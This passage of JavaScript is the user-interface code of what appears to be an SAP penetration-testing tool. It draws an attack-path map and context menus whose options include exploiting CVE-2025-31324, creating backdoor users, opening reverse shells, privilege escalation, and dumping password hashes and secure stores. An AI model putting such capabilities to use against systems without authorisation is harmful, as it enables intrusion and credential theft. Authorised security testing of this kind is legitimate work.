      const tx = (tgtN._x||0) + BOX_W_h/2, ty = (tgtN._y||0) + BOX_H_h/2;
      // Glow underlay
      html += `<line x1="${sx}" y1="${sy}" x2="${tx}" y2="${ty}" stroke="#e74c3c" stroke-width="12" opacity="0.25" stroke-linecap="round">` +
        `<animate attributeName="opacity" values="0.15;0.35;0.15" dur="2s" repeatCount="indefinite" /></line>`;
      // Main line
      html += `<line x1="${sx}" y1="${sy}" x2="${tx}" y2="${ty}" stroke="#e74c3c" stroke-width="4" stroke-linecap="round">` +
        `<animate attributeName="stroke" values="#e74c3c;#ff6b6b;#e74c3c" dur="1.5s" repeatCount="indefinite" /></line>`;
      // Arrow head at midpoint
      const mx = (sx+tx)/2, my = (sy+ty)/2;
      html += `<text x="${mx}" y="${my-8}" text-anchor="middle" font-size="16" fill="#e74c3c" opacity="0.8">&#9654;</text>`;
    }
    // Hop number badges on each node in the chain
    for (let i = 0; i < _highlightedChain.length; i++) {
      const nSid = _highlightedChain[i];
      const nNode = _resolveChainSid(nSid);
      if (!nNode) continue;
      const bx = (nNode._x||0) + BOX_W_h - 8, by = (nNode._y||0) - 8;
      const isStart = (i === 0), isEnd = (i === _highlightedChain.length - 1);
      const badgeCol = isStart ? '#f0883e' : isEnd ? '#e74c3c' : '#d29922';
      const label = isStart ? '&#9733;' : isEnd ? '&#127919;' : String(i);
      html += `<circle cx="${bx}" cy="${by}" r="14" fill="${badgeCol}" stroke="#0d1117" stroke-width="2">` +
        `<animate attributeName="r" values="14;16;14" dur="1.5s" repeatCount="indefinite" /></circle>`;
      html += `<text x="${bx}" y="${by+5}" text-anchor="middle" font-size="12" fill="#fff" font-weight="bold">${label}</text>`;
    }
  }

  svg.innerHTML = html;

  // Keep the pulse overlay's viewBox matched so pulse rects/lines land
  // on the same world coordinates as the main map.
  const pulseSvg = document.getElementById('pulse-svg');
  if (pulseSvg) {
    pulseSvg.setAttribute('viewBox',
      svg.getAttribute('viewBox') || `0 0 ${viewBox.w} ${viewBox.h}`);
  }

  // Post-render: animate new connection lines (draw effect)
  svg.querySelectorAll('.edge-line[data-new="1"]').forEach(el => {
    const len = el.getTotalLength ? el.getTotalLength() : 500;
    el.style.strokeDasharray = len;
    el.style.strokeDashoffset = len;
    el.style.transition = 'stroke-dashoffset 0.8s ease-out';
    el.getBoundingClientRect(); // force reflow
    el.style.strokeDashoffset = '0';
    el.addEventListener('transitionend', () => {
      const origDash = el.getAttribute('data-orig-dash') || '';
      el.style.strokeDasharray = origDash || '';
      el.style.strokeDashoffset = '';
      el.style.transition = '';
    }, { once: true });
  });

  // Update tracking sets
  knownNodeSids = new Set(nodeKeys);
  knownConnKeys = newConnKeys;
  if (firstRender) {
    firstRender = false;
    // Default view: Hierarchy.  When nodes appear for the first
    // time in this session, apply the layered top-down RFC-flow
    // layout so trust direction reads at a glance (sources of
    // edges on upper layers, targets below).  Deferred one tick
    // (setTimeout 0) so the current updateMap completes before
    // layoutHierarchy triggers its own re-render.  Skipped when
    // there are no nodes yet (waiting on a scan).
    if (nodeKeys.length > 0 || _sccCount > 0) {
      setTimeout(() => {
        try { layoutHierarchy(); } catch (_) {}
      }, 0);
    }
  }

  // Schedule fast re-renders while nodes are still fading in
  if (Object.keys(fadingNodes).length > 0) {
    setTimeout(updateMap, 80);
  }
}

// --- Event handlers ---
function downloadCsv(sid, scenario) {
  // Use the query-string route so scenario names containing "/"
  // (e.g. "PI/PO Message Tampering") survive HTTP routing — Bottle's
  // <name> placeholder doesn't match a literal slash, even when the
  // browser %2F-encodes it.
  const url = '/api/node/' + encodeURIComponent(sid) +
              '/impact/export?scenario=' + encodeURIComponent(scenario);
  fetch(url)
    .then(r => r.text().then(text => ({ ok: r.ok, status: r.status, text })))
    .then(({ ok, status, text }) => {
      let data = null;
      try { data = JSON.parse(text); } catch (e) { /* non-JSON body */ }
      if (data && data.status === 'ok') {
        alert('Exported ' + data.records + ' records to:\n' + data.file);
      } else if (data && data.error) {
        alert('Export failed: ' + data.error);
      } else {
        alert('Export failed: HTTP ' + status + (text ? '\n' + text.slice(0, 200) : ''));
      }
    })
    .catch(err => alert('Export error: ' + err));
}

function escHtml(s) {
  if (!s) return '';
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}

function showCtxMenu(e, sid) {
  e.preventDefault();
  e.stopPropagation();
  hideMapCtxMenu();
  hideSCCCtxMenu();
  hideBTPCtxMenu();
  selectedNodeSid = sid;
  const n = (mapState.nodes || {})[sid];
  const menu = document.getElementById('ctx-menu');

  // Determine node capabilities
  const hasCreds = n && ((n.credentials || []).length > 0 || (n.created_users || []).length > 0 || n.pwned);
  // Strict: a credential we KNOW works.  Required by every ABAP
  // data-extraction action (retrieve_rfcs / download_hashes /
  // download_secstore / download_table / client_roles /
  // analyse_capabilities / impact_assess / create_tcpip).
  // node.pwned alone (e.g. GW-vuln before user-creation) is not
  // enough — the BAPI / RFC_READ_TABLE calls need an actual logon.
  const hasVerifiedCred = !!(n &&
    (n.credentials || []).some(c => c && c.verified));
  const hasGwVuln = n && n.gw_vulnerable;
  const hasMsVuln = n && n.ms_vulnerable;
  const hasMsPort = n && n.ms_port > 0;
  const sysType = (n && typeof n.system_type === 'string') ? n.system_type.toUpperCase() : '';
  const isJavaStack = sysType.indexOf('JAVA') !== -1;
  const isAbapStack = sysType.indexOf('ABAP') !== -1;
  const isSaprouter = sysType.indexOf('SAPROUTER') !== -1;
  const isWindows = n && (n.os_type || '').toLowerCase().includes('windows');
  const hasCve31324 = n && n.cve_2025_31324_vulnerable;
  const hasCve6287  = n && n.cve_2020_6287_vulnerable;
  const hasGwPort = n && (n.instances || []).some(i => Object.entries(i.ports || {}).some(([p,s]) => s === 'gateway' || (p >= 3300 && p <= 3399)));
  const hasFindings = n && (n.findings || []).length > 0;
  const hasCreatedUsers = n && (n.created_users || []).length > 0;
  // A Java admin user (from RECON or CVE-31324) unlocks the CTC / telnet
  // deploy paths for Java data extraction — but ONLY if at least one of
  // those primitives is reachable on the target.  java_deploy_blocked
  // is set by the backend after we have confirmed both are unavailable
  // (CTC ConfigServlet 404 + no telnet console reachable).  On a
  // hardened AS Java, RECON stays useful for user creation but data
  // extraction is greyed out with a tooltip explaining why.
  const hasJavaAdmin = isJavaStack && (n.created_users || []).some(u =>
    (u.method || '').toLowerCase().indexOf('java') === 0 && u.password);
  const javaDeployBlocked = !!(n && n.java_deploy_blocked);
  const hasJavaDeploy = hasJavaAdmin && !javaDeployBlocked;
  const hasRFCs = (mapState.connections || []).some(c => c.source_sid === sid);
  const hasUntested = (mapState.connections || []).some(c => c.source_sid === sid && !c.tested);
  // Composite: every ABAP RFC-driven data-extraction action gates
  // on this.  ABAP stack + (verified cred OR a SAPMAP-created user
  // — the latter implies its own working password).
  const hasUsableAbapAccess = isAbapStack
    && (hasVerifiedCred || hasCreatedUsers);

  // Enable/disable rules per action
  const rules = {
    'details':          true,                       // always available
    'findings':         true,                       // always (shows "no findings" if empty)
    'credentials':      true,                       // always available
    'rfc_system_info':  hasGwPort,                   // need a gateway port
    'check_gw':         hasGwPort,                   // need a gateway port
    'check_ms':              true,                    // always (probes 39NN directly)
    'check_cve_31324':       isJavaStack,             // Java-only vulnerability
    'check_cve_6287':        isJavaStack,             // Java-only RECON check
    'exploit_cve_31324_drop': hasCve31324,            // need confirmed CVE-2025-31324
    'create_user_java':      isJavaStack && (hasCve31324 || hasCve6287 || hasGwVuln),
    'betrusted':             hasMsPort,              // need a known MS port
    'create_user_betrusted': hasMsVuln || hasGwVuln, // need vulnerable MS or GW
    'create_user_gw':   hasGwVuln,                  // need GW vulnerability
    'create_user_creds': hasCreds,                  // need credentials
    'lpe':              isAbapStack && hasCreds,    // ABAP-only (BAPI-driven)
    'check_linux_lpe':   !isWindows && (hasGwVuln || hasCve31324 || hasCreatedUsers),
    'exploit_linux_lpe': !isWindows && (hasGwVuln || hasCve31324 || hasCreatedUsers),
    'deep_scan':        true,                       // always available
    'standard_scan':    !!n.discovered_via_btp,     // BTP placeholders only
    // ABAP-only AND needs a real credential (verified RFC login or
    // a SAPMAP-created user) — the analyser reads AGR_USERS / UST04
    // via RFC; node.pwned alone (e.g. pwned via GW exploit without
    // a user created yet) doesn't give us a way to call those reads.
    'analyse_capabilities': isAbapStack && (
        (n && (n.credentials || []).some(c => c && c.verified))
        || hasCreatedUsers),
    'retrieve_rfcs':    hasUsableAbapAccess,        // ABAP-only RFC + BAPI
    'test_rfcs':        hasUsableAbapAccess && hasRFCs,
    'read_java_destinations': isJavaStack && (hasCve31324 || hasGwVuln || hasJavaDeploy),
    // ABAP path uses RFC BAPIs (SAP_ALL user or gateway); Java path
    // needs a JSP-deploy primitive. A RECON UME user alone with no
    // reachable CTC/telnet cannot extract hashes/tables, so gate the
    // Java branch on hasJavaDeploy rather than hasJavaAdmin.
    'download_hashes':    hasUsableAbapAccess ||
                          (isJavaStack && (hasCve31324 || hasGwVuln || hasJavaDeploy)),
    'download_secstore':  hasUsableAbapAccess,        // RSECTAB is ABAP
    'download_java_secstore': isJavaStack && (hasCve31324 || hasGwVuln || hasJavaDeploy),
    'view_java_secstore':     n && n.java_secstore_checked,
    'download_table':     hasUsableAbapAccess ||
                          (isJavaStack && (hasCve31324 || hasGwVuln || hasJavaDeploy)),
    // ABAP-only AND needs a real credential (verified RFC login or
    // a SAPMAP-created user).  node.pwned alone isn't enough — the
    // BAPI / RFC_READ_TABLE calls behind the impact scenarios fail
    // without a working logon.
    'impact_assess':      isAbapStack && (
        (n && (n.credentials || []).some(c => c && c.verified))
        || hasCreatedUsers),
    'impact_view':        (n.impact_results||[]).length > 0,
    'impact_assess_java': isJavaStack && (hasCve31324 || hasGwVuln || hasJavaDeploy),
    // Three OS-exec paths:
    //   - GW SAPXPG: works on ANY SAP gateway (ABAP or Java), regardless
    //     of stack — SAPMAP's own probe confirms by running `whoami` as
    //     <sid>adm. So hasGwVuln enables terminal regardless of stack.
    //   - ABAP SXPG: requires an ABAP dialog/RFC user with SAP_ALL.
    //   - CVE-2025-31324 webshell: Java only, unauth.
    'os_terminal':      hasGwVuln || (isAbapStack && hasCreatedUsers) || hasCve31324,
    'reverse_shell':    hasGwVuln || (isAbapStack && hasCreatedUsers) || hasCve31324,
    'harvest_scc':          hasGwVuln || hasCve31324 || hasCreatedUsers,
    'harvest_scc_mappings': hasGwVuln || hasCve31324 || hasCreatedUsers,
    'harvest_scc_ssfs':     hasGwVuln || hasCve31324 || hasCreatedUsers,
    'scc_via_sap_set_credentials':  true,
    'scc_via_sap_probe_creds':      true,
    'scc_via_sap_pull_mappings':    true,
    'scc_via_sap_probe_mappings':   true,
    'scc_via_sap_extract_keystore': true,
    'scc_via_sap_download_hashes':  hasGwVuln || hasCve31324 || hasCreatedUsers,
    // ABAP-only — Type-T destination + RFC_DESTINATION_INSERT need a
    // working ABAP logon.  Same verified-cred / created-user gate as
    // the other RFC-driven actions.
    'create_tcpip':     isAbapStack && (
        (n && (n.credentials || []).some(c => c && c.verified))
        || hasCreatedUsers),
    'propagate':        hasCreds,                   // need access to propagate from
    // Harvest is pure introspection over already-captured state, so
    // any node will return *something* (often nothing, that's fine).
    // Always available — operator decides whether to mint.
    'harvest_btp_creds': true,
    'cleanup':          hasCreatedUsers,             // need created users to clean up
    'client_roles':     hasUsableAbapAccess,        // ABAP-only RFC reads
    'set_type':         true,                       // always available
    'set_db_type':      true,                       // always available
    'set_os_type':      true,                       // always available
    'set_instance_nr':  true,                       // always available
    'enum_clients':     true,                       // always (uses DIAG, no creds needed)
    'default_creds':    true,                       // always (uses DIAG, no creds needed)
    'check_router_info': true,                     // always (direct TCP, no creds)
    'router_scan':      true,                       // always (probes via SAProuter, no creds)
    'set_saprouter':    true,                       // always available
    'set_telnet_override': isJavaStack,              // only meaningful for Java stacks
    'delete_system':    true,                       // always available
  };

  // Tooltip hints for disabled items
  const hints = {
    'rfc_system_info':  'No gateway port detected',
    'check_gw':         'No gateway port detected',
    'betrusted':             'Run Check MS Betrusted first to find the MS port',
    'create_user_betrusted': 'Requires a vulnerable MS (betrusted) or gateway',
    'check_cve_31324':       'Only applicable to Java / double-stack systems',
    'check_cve_6287':        'Only applicable to Java / double-stack systems',
    'exploit_cve_31324_drop': 'Run Check CVE-2025-31324 first; vulnerability required',
    'create_user_java':      'Requires Java / dual-stack system AND a usable CVE-2025-31324, RECON, or GW SAPXPG vuln',
    'create_user_gw':   'Requires a vulnerable RFC Gateway',
    'create_user_creds': 'Provide credentials first',
    'lpe':              'Provide credentials first',
    'check_linux_lpe':   'Requires OS-exec on Linux host',
    'exploit_linux_lpe': 'Requires OS-exec on Linux host — run Check first to confirm at least one technique (Copy Fail or Dirty Frag) is viable',
    'retrieve_rfcs':    'Needs a verified RFC credential or a SAPMAP-created user — RSRFCCHK and the RFCDES read both require a working logon.',
    'test_rfcs':        (!hasRFCs
        ? 'Retrieve RFC connections first.'
        : 'Needs a verified RFC credential or a SAPMAP-created user.'),
    'read_java_destinations': (javaDeployBlocked
        ? 'RECON admin user exists but no JSP-deploy primitive is reachable (CTC ConfigServlet removed, admin telnet firewalled). System is hardened — data extraction not available from here.'
        : 'Requires Java/dual-stack + CVE-2025-31324, GW SAPXPG, or a Java admin user with a reachable CTC / telnet endpoint'),
    'download_hashes':    (isJavaStack && !isAbapStack && javaDeployBlocked
        ? 'RECON admin user exists but no JSP-deploy primitive is reachable (CTC ConfigServlet removed, admin telnet firewalled). Hashes cannot be extracted from a Java-only hardened target.'
        : (isAbapStack
            ? 'Needs a verified RFC credential or a SAPMAP-created user — USR02 read needs an actual ABAP logon.'
            : 'Java stack: requires CVE-2025-31324, GW SAPXPG, or a Java admin user with a reachable CTC / telnet endpoint.')),
    'download_secstore':  'Needs a verified RFC credential or a SAPMAP-created user — the RSECTAB read needs an actual ABAP logon.',
    'download_java_secstore': (javaDeployBlocked
        ? 'RECON admin user exists but no JSP-deploy primitive is reachable (CTC ConfigServlet removed, admin telnet firewalled). System is hardened — data extraction not available from here.'
        : 'Requires Java/dual-stack + CVE-2025-31324, GW SAPXPG, or a Java admin user with a reachable CTC / telnet endpoint'),
    'view_java_secstore':     'Run Download Java Secure Store first',
    'download_table':     (isJavaStack && !isAbapStack && javaDeployBlocked
        ? 'RECON admin user exists but no JSP-deploy primitive is reachable (CTC ConfigServlet removed, admin telnet firewalled). Tables cannot be dumped from a Java-only hardened target.'
        : (isAbapStack
            ? 'Needs a verified RFC credential or a SAPMAP-created user — RFC_READ_TABLE needs an actual ABAP logon.'
            : 'Java stack: requires CVE-2025-31324, GW SAPXPG, or a Java admin user with a reachable CTC / telnet endpoint.')),
    'impact_assess':      (!isAbapStack
        ? 'Run Business Impact Scenarios is ABAP-only — BSEG / LFBK / PA0008 are ABAP DDIC tables.'
        : 'Needs a verified RFC credential or a SAPMAP-created user — the impact scenarios run BAPI / RFC_READ_TABLE calls that require an actual logon.  node.pwned alone (e.g. via GW exploit before user creation) is not enough.'),
    'analyse_capabilities': (!isAbapStack
        ? 'Capability analyser is ABAP-only — it reads AGR_USERS / AGR_1251 / UST04 to map a user\'s privileges.  Java systems use a different role model.'
        : 'Needs a verified RFC credential or a SAPMAP-created user — the analyser reads AGR_USERS / UST04 via RFC.  Save credentials or create a user first.'),
    'impact_view':        'Run impact assessment first',
    'impact_assess_java': (javaDeployBlocked
        ? 'RECON admin user exists but no JSP-deploy primitive is reachable (CTC ConfigServlet removed, admin telnet firewalled). System is hardened — data extraction not available from here.'
        : 'Requires Java/dual-stack + CVE-2025-31324, GW SAPXPG, or a Java admin user with a reachable CTC / telnet endpoint'),
    'os_terminal':      'Requires an OS-exec path: vulnerable GW (any stack), ABAP+created-user (SXPG), or CVE-2025-31324 webshell (Java)',
    'reverse_shell':    'Requires an OS-exec path: vulnerable GW (any stack), ABAP+created-user (SXPG), or CVE-2025-31324 webshell (Java)',
    'harvest_scc':          'Requires OS-exec on this node AND an SCC on the same host IP',
    'harvest_scc_mappings': 'Requires OS-exec on this node AND an SCC on the same host IP',
    'create_tcpip':     (!isAbapStack
        ? 'Create TCP/IP Dest is ABAP-only — RFC Type-T destinations + RFC_DESTINATION_INSERT live on the ABAP stack.'
        : 'Needs a verified RFC credential or a SAPMAP-created user — RFC_DESTINATION_INSERT requires an actual logon.  Save credentials or create a user first.'),
    'propagate':        'Provide credentials or create a user first',
    'cleanup':          'No created users to clean up',
    'client_roles':     'Needs a verified RFC credential or a SAPMAP-created user — the role-walk reads AGR_USERS / AGR_DEFINE via RFC.',
  };

  // Items hidden entirely (not just disabled) when the node type doesn't
  // match.  A workflow that's inapplicable on this stack type shouldn't
  // clutter the menu with grayed-out entries.
  const hidden = {
    // ABAP-only: these use BAPIs / DIAG / RFC-specific to the ABAP stack
    'credentials':      !isAbapStack,
    'enum_clients':     !isAbapStack,
    'client_roles':     !isAbapStack,
    'default_creds':    !isAbapStack,
    'retrieve_rfcs':    !isAbapStack,
    'test_rfcs':        !isAbapStack,
    'create_tcpip':          !isAbapStack,
    'create_user_creds':     !isAbapStack,
    'create_user_betrusted': !isAbapStack,
    'download_secstore':     !isAbapStack,  // RSECTAB is an ABAP table
    // create_user_gw stays visible on both ABAP and Java — click handler
    // dispatches to the right backend (ABAP USR02 SQL insert vs. Java UME
    // via JSP), and is hidden only on non-ABAP/non-Java stacks.
    'create_user_gw':        !(isAbapStack || isJavaStack),
    // SAProuter-only: reads the ROUTER_ADM info page
    'check_router_info': !isSaprouter,
    // Java-only (dual-stack also counts as Java here)
    'download_java_secstore':     !isJavaStack,
    'view_java_secstore':         !isJavaStack,
    'read_java_destinations':     !isJavaStack,
    'check_cve_6287':             !isJavaStack,
    'check_cve_31324':            !isJavaStack,
    'exploit_cve_31324_drop':     !isJavaStack,
    'analyse_capabilities':       !isAbapStack,
    'set_telnet_override':        !isJavaStack,
    'impact_assess':              !isAbapStack,
    'lpe':                        !isAbapStack,
    'impact_assess_java':         !isJavaStack,
    'check_linux_lpe':   isWindows,
    'exploit_linux_lpe': isWindows,
    // SCC harvest items — hidden entirely unless an SCC is on the same host
    'harvest_scc':          !_hasSccOnSameHost(n),
    'harvest_scc_mappings': !_hasSccOnSameHost(n),
    'harvest_scc_ssfs':     !_hasSccOnSameHost(n),
    // SCC submenu items — hidden when no SCC on same host
    'scc_via_sap_set_credentials':   !_hasSccOnSameHost(n),
    'scc_via_sap_probe_creds':       !_hasSccOnSameHost(n),
    'scc_via_sap_pull_mappings':     !_hasSccOnSameHost(n),
    'scc_via_sap_probe_mappings':    !_hasSccOnSameHost(n),
    'scc_via_sap_extract_keystore':  !_hasSccOnSameHost(n),
    'scc_via_sap_download_hashes':   !_hasSccOnSameHost(n),
  };

  // Apply visibility + enable/disable state to each menu item
  menu.querySelectorAll('.ctx-item[data-action]').forEach(item => {
    const action = item.getAttribute('data-action');
    if (hidden[action]) {
      item.style.display = 'none';
      return;
    }
    item.style.display = '';
    const enabled = rules[action] !== false;
    if (enabled) {
      item.classList.remove('disabled');
      item.removeAttribute('title');
    } else {
      item.classList.add('disabled');
      item.setAttribute('title', hints[action] || 'Not available');
    }
  });

  // Hide any submenu group whose actions are all hidden — avoids showing
  // a parent label like "Business Impact" or "Data Extraction" that opens
  // to an empty flyout (common on SAProuter / SCC nodes where most ABAP /
  // Java actions are not applicable).  Walks every .ctx-group and hides
  // it when zero [data-action] items inside its .ctx-sub remain visible.
  // Uses a direct .style.display check rather than an attribute selector
  // because browsers normalise inline styles inconsistently (with/without
  // a space after the colon, with/without trailing semicolon) and
  // [style*="display: none"] misses some of those forms.
  menu.querySelectorAll('.ctx-group').forEach(group => {
    const sub = group.querySelector('.ctx-sub');
    if (!sub) return;   // not a submenu — leave alone
    const all = sub.querySelectorAll(':scope > .ctx-item[data-action]');
    let visible = 0;
    all.forEach(it => { if (it.style.display !== 'none') visible++; });
    group.style.display = visible === 0 ? 'none' : '';
  });

  // Show existing credentials / created users in the menu
  let oldInfo = menu.querySelector('.ctx-cred-info');
  if (oldInfo) oldInfo.remove();
  if (n && hasCreds) {
    const info = document.createElement('div');
    info.className = 'ctx-cred-info';
    info.style.cssText = 'padding:4px 12px;font-size:10px;color:#8b949e;border-top:1px solid #30363d;pointer-events:none';
    let lines = [];
    for (const c of (n.credentials || [])) {
      const mark = c.verified ? '\u2705' : '\u274C';
      lines.push(`${mark} ${c.username} / client ${c.client} / inst ${c.instance_nr}`);
    }
    for (const u of (n.created_users || [])) {
      lines.push(`\u26A1 ${u.username} / client ${u.client} (created)`);
    }
    if (lines.length) info.innerHTML = lines.join('<br>');
    // Insert after the "Provide Credentials" item
    const credItem = menu.querySelector('[data-action="credentials"]');
    if (credItem && credItem.nextSibling) {
      credItem.parentNode.insertBefore(info, credItem.nextSibling);
    } else {
      menu.appendChild(info);
    }
  }

  // Position menu within viewport — measure actual height
  menu.classList.add('visible');
  const menuRect = menu.getBoundingClientRect();
  let menuX = e.clientX, menuY = e.clientY;
  if (menuX + menuRect.width > window.innerWidth) menuX = window.innerWidth - menuRect.width - 4;
  if (menuY + menuRect.height > window.innerHeight) menuY = window.innerHeight - menuRect.height - 4;
  if (menuY < 0) { menuY = 0; menu.style.maxHeight = window.innerHeight + 'px'; menu.style.overflowY = 'auto'; }
  else { menu.style.maxHeight = ''; menu.style.overflowY = ''; }
  menu.style.left = menuX + 'px';
  menu.style.top = menuY + 'px';

  // Flip flyout submenus left if they would overflow the viewport
  menu.querySelectorAll('.ctx-sub').forEach(sub => {
    sub.classList.remove('flip-left');
    if (menuX + menuRect.width + 260 > window.innerWidth) {
      sub.classList.add('flip-left');
    }
  });
}

function hideCtxMenu() {
  document.getElementById('ctx-menu').classList.remove('visible');
}

// Delegate clicks from context menu items
document.getElementById('ctx-menu').addEventListener('click', function(e) {
  const item = e.target.closest('.ctx-item[data-action]');
  if (!item || item.classList.contains('disabled')) return;
  ctxAction(item.getAttribute('data-action'));
});

// --- SAP Cloud Connector context menu ---
let selectedSccHost = null;

function showSCCCtxMenu(e, host) {
  e.preventDefault();
  e.stopPropagation();
  hideCtxMenu();
  hideMapCtxMenu();
  hideBTPCtxMenu();
  selectedSccHost = host;
  const menu = document.getElementById('scc-ctx-menu');

  // Show stored credentials below the "Set Credentials" item — same
  // pattern as ABAP nodes showing credentials in their context menu.
  let oldInfo = menu.querySelector('.ctx-cred-info');
  if (oldInfo) oldInfo.remove();
  const sn = (mapState.scc_nodes || {})[host];
  const creds = (sn && sn.credentials) ? sn.credentials : [];
  if (creds.length > 0) {
    const info = document.createElement('div');
    info.className = 'ctx-cred-info';
    info.style.cssText = 'padding:4px 12px;font-size:10px;color:#8b949e;border-top:1px solid #30363d;pointer-events:none';
    const lines = creds.map(c => {
      const u = c.username || c.user || '?';
      const p = c.password || '';
      return `\u2705 ${escHtml(u)}${p ? ' / ' + escHtml(p) : ''}`;
    });
    info.innerHTML = lines.join('<br>');
    const credItem = menu.querySelector('[data-action="scc_set_credentials"]');
    if (credItem && credItem.nextSibling) {
      credItem.parentNode.insertBefore(info, credItem.nextSibling);
    } else {
      menu.appendChild(info);
    }
  }

  menu.classList.add('visible');
  // Position with viewport clamp
  const w = menu.offsetWidth || 280;
  const h = menu.offsetHeight || 200;
  const x = Math.min(e.clientX, window.innerWidth - w - 8);
  const y = Math.min(e.clientY, window.innerHeight - h - 8);
  menu.style.left = x + 'px';
  menu.style.top = y + 'px';
}

function hideSCCCtxMenu() {
  document.getElementById('scc-ctx-menu').classList.remove('visible');
}

document.getElementById('scc-ctx-menu').addEventListener('click', function(e) {
  const item = e.target.closest('.ctx-item[data-action]');
  if (!item || item.classList.contains('disabled')) return;
  const action = item.getAttribute('data-action');
  hideSCCCtxMenu();
  const host = selectedSccHost;
  if (!host) return;
  switch (action) {
    case 'scc_details':          showSCCDetail(host); break;
    case 'scc_set_credentials':  showSCCCredModal(host); break;
    case 'scc_probe_creds':      sccProbeCreds(host); break;
    case 'scc_pull_mappings':    sccPullMappings(host); break;
    case 'scc_probe_mappings':   sccProbeMappings(host); break;
    case 'scc_extract_keystore':  sccExtractKeystore(host); break;
    case 'scc_download_hashes':  sccDownloadHashes(host); break;
    case 'scc_delete':            sccRemoveFromMap(host); break;
  }
});

async function sccRemoveFromMap(host) {
  if (!confirm('Remove SCC ' + host + ' from the map? (Local-only; will reappear on next scan if still present.)')) return;
  if (mapState.scc_nodes) delete mapState.scc_nodes[host];
  renderMap();
}

// --- BTP subaccount context menu --------------------------------------
let selectedBtpUuid = null;

function showBTPCtxMenu(e, uuid) {
  e.preventDefault();
  e.stopPropagation();
  hideCtxMenu();
  hideSCCCtxMenu();
  hideMapCtxMenu();
  selectedBtpUuid = uuid;
  const menu = document.getElementById('btp-ctx-menu');
  // Disable copy items when the underlying field is empty so the
  // operator gets visual feedback rather than a silent no-op.
  const bn = (mapState.btp_subaccounts || {})[uuid] || {};
  const setEnabled = (action, enabled) => {
    const el = menu.querySelector(`[data-action="${action}"]`);
    if (!el) return;
    if (enabled) el.classList.remove('disabled');
    else         el.classList.add('disabled');
  };
  setEnabled('btp_copy_subdomain', !!bn.subdomain);
  setEnabled('btp_copy_region',    !!bn.region);
  const linkedCount = (bn.destinations || [])
    .filter(d => d && d.linked_target_sid).length;
  setEnabled('btp_highlight_links', linkedCount > 0);
  menu.classList.add('visible');
  const w = menu.offsetWidth || 280;
  const h = menu.offsetHeight || 200;
  const x = Math.min(e.clientX, window.innerWidth  - w - 8);
  const y = Math.min(e.clientY, window.innerHeight - h - 8);
  menu.style.left = x + 'px';
  menu.style.top  = y + 'px';
}

function hideBTPCtxMenu() {
  document.getElementById('btp-ctx-menu').classList.remove('visible');
}

document.getElementById('btp-ctx-menu').addEventListener('click', function(e) {
  const item = e.target.closest('.ctx-item[data-action]');
  if (!item || item.classList.contains('disabled')) return;
  const action = item.getAttribute('data-action');
  hideBTPCtxMenu();
  const uuid = selectedBtpUuid;
  if (!uuid) return;
  const bn = (mapState.btp_subaccounts || {})[uuid] || {};
  switch (action) {
    case 'btp_details':
      showBTPDetail(uuid);
      break;
    case 'btp_pull_destinations':
      btpRefreshDestinations(uuid);
      break;
    case 'btp_highlight_links':
      btpHighlightLinkedTargets(uuid);
      break;
    case 'btp_copy_uuid':
      _copyToClipboard(uuid, 'UUID');
      break;
    case 'btp_copy_subdomain':
      _copyToClipboard(bn.subdomain || '', 'subdomain');
      break;
    case 'btp_copy_region':
      _copyToClipboard(bn.region || '', 'region');
      break;
    case 'btp_remove':
      btpRemoveFromMap(uuid);
      break;
  }
});

async function btpRefreshDestinations(uuid) {
  flashActivity('BTP ' + uuid.slice(0, 8) + ': re-pulling destinations', 8000);
  try {
    const r = await fetch('/api/btp/pull_destinations/' + encodeURIComponent(uuid),
                          { method: 'POST', headers: {'Content-Type':'application/json'}, body: '{}' });
    const d = await r.json();
    if (d.error) {
      alert('Refresh failed: ' + d.error);
    } else {
      showToast('BTP destinations refreshed', 'info');
    }
  } catch (e) {
    alert('Refresh error: ' + e);
  }
}

function btpHighlightLinkedTargets(uuid) {
  const bn = (mapState.btp_subaccounts || {})[uuid];
  if (!bn) return;
  const targets = (bn.destinations || [])
    .map(d => d && d.linked_target_sid)
    .filter(Boolean);
  const unique = Array.from(new Set(targets));
  if (unique.length === 0) {
    showToast('No linked on-prem targets to highlight', 'info');
    return;
  }
  unique.forEach(sid => { try { _pulseNode(sid, 'CRITICAL'); } catch (_) {} });
  showToast(`Pulsing ${unique.length} linked target${unique.length>1?'s':''}: ${unique.join(', ')}`, 'info');
}

function btpRemoveFromMap(uuid) {
  if (!confirm('Remove BTP subaccount ' + (uuid.slice(0, 8)) + '… from the map?\n\n'
              + '(Local-only; will reappear next time you re-enumerate '
              + 'with a token for the same subaccount.)')) return;
  if (mapState.btp_subaccounts) delete mapState.btp_subaccounts[uuid];
  renderMap();
}

function _copyToClipboard(text, label) {
  if (!text) { showToast('Nothing to copy', 'info'); return; }
  try {
    navigator.clipboard.writeText(text);
    showToast(`Copied ${label} to clipboard`, 'info');
  } catch (e) {
    // Fallback for older browsers / restrictive contexts
    const ta = document.createElement('textarea');
    ta.value = text;
    document.body.appendChild(ta);
    ta.select();
    try { document.execCommand('copy'); } catch (_) {}
    ta.remove();
    showToast(`Copied ${label} to clipboard`, 'info');
  }
}

function _sccStoredCreds(host) {
  // Return the first stored credential for an SCC node, or null.
  const sn = (mapState.scc_nodes || {})[host];
  const creds = sn && sn.credentials;
  if (creds && creds.length > 0) return creds[0];
  return null;
}

function showSCCCredModal(host) {
  const stored = _sccStoredCreds(host);
  document.getElementById('scc-cred-system-info').textContent =
    'Cloud Connector: ' + host + (stored ? '  (stored credentials will be replaced)' : '');
  document.getElementById('scc-cred-user').value = (stored && stored.username) ? stored.username : 'Administrator';
  document.getElementById('scc-cred-pass').value = (stored && stored.password) ? stored.password : '';
  document.getElementById('scc-cred-modal').dataset.host = host;
  document.getElementById('scc-cred-modal').classList.add('visible');
}

async function saveSCCCredentials() {
  const modal = document.getElementById('scc-cred-modal');
  const host = modal.dataset.host;
  const u = document.getElementById('scc-cred-user').value.trim();
  const p = document.getElementById('scc-cred-pass').value;
  if (!u || !p) { alert('Username and password are required.'); return; }
  try {
    flashActivity('SCC ' + host + ': saving credentials', 3000);
    const r = await fetch('/api/scc/' + encodeURIComponent(host) + '/set_credentials',
                          { method: 'POST', headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ username: u, password: p }) });
    const d = await r.json();
    if (d.error) { alert('Failed: ' + d.error); return; }
    closeModal('scc-cred-modal');
    await pollUpdates();
  } catch (e) { alert('Error: ' + e); }
}

async function ctxAction(action) {
  hideCtxMenu();
  if (!selectedNodeSid) return;
  const sid = selectedNodeSid;

  switch (action) {
